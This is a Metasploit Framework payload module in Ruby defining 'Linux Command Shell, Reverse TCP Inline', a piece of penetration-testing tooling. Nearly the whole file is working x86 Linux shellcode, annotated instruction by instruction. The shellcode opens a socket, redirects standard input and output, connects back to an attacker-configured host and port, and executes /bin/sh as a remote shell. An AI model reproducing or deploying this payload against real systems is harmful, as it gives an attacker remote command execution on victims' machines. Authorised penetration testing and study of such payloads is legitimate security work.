##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Ramon de C Valle',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 25, 'ADDR' ],
							'LPORT'    => [ 32, 'n'    ],
						},
					'Payload' =>
						"\x31\xdb"             +#   xor ebx,ebx
						"\xf7\xe3"             +#   mul ebx
						"\x53"                 +#   push ebx
						"\x43"                 +#   inc ebx
						"\x53"                 +#   push ebx
						"\x6a\x02"             +#   push byte +0x2
						"\x89\xe1"             +#   mov ecx,esp
						"\xb0\x66"             +#   mov al,0x66
						"\xcd\x80"             +#   int 0x80
						"\x93"                 +#   xchg eax,ebx
						"\x59"                 +#   pop ecx
						"\xb0\x3f"             +#   mov al,0x3f
						"\xcd\x80"             +#   int 0x80
						"\x49"                 +#   dec ecx
						"\x79\xf9"             +#   jns 0x11
						"\x68\x7f\x00\x00\x01" +#   push dword 0x100007f
						"\x68\x02\x00\xbf\xbf" +#   push dword 0xbfbf0002
						"\x89\xe1"             +#   mov ecx,esp
						"\xb0\x66"             +#   mov al,0x66
						"\x50"                 +#   push eax
						"\x51"                 +#   push ecx
						"\x53"                 +#   push ebx
						"\xb3\x03"             +#   mov bl,0x3
						"\x89\xe1"             +#   mov ecx,esp
						"\xcd\x80"             +#   int 0x80
						"\x52"                 +#   push edx
						"\x68\x2f\x2f\x73\x68" +#   push dword 0x68732f2f
						"\x68\x2f\x62\x69\x6e" +#   push dword 0x6e69622f
						"\x89\xe3"             +#   mov ebx,esp
						"\x52"                 +#   push edx
						"\x53"                 +#   push ebx
						"\x89\xe1"             +#   mov ecx,esp
						"\xb0\x0b"             +#   mov al,0xb
						"\xcd\x80"              #   int 0x80
				}
			))
	end

end
